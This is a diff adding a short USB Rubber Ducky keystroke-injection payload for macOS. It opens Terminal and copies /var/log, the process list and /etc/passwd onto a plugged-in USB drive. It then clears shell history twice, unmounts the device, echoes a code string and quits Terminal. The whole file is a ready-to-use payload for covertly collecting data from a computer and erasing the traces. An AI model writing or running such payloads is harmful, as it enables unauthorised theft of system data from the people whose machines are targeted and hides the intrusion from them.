@@ -1,0 +1,30 @@
+DELAY 250
+GUI SPACE
+DELAY 250
+STRING Terminal
+ENTER
+DELAY 250
+STRING cp -r /var/log/ /Volumes/WILL\ P/$USER/
+ENTER
+DELAY 30000
+STRING ps -e > /Volumes/WILL\ P/$USER/psOutput
+ENTER
+DELAY 250
+STRING cat /etc/passwd > /Volumes/WILL\ P/$USER/passwdOutput
+ENTER
+DELAY 250
+STRING history -c
+ENTER
+STRING diskutil umount /Volumes/RubberDucky
+ENTER
+DELAY 250
+STRING history -c
+ENTER
+STRING echo 5A13X99
+ENTER
+DELAY 250
+STRING exit
+ENTER
+DELAY 250
+GUI q
+ENTER
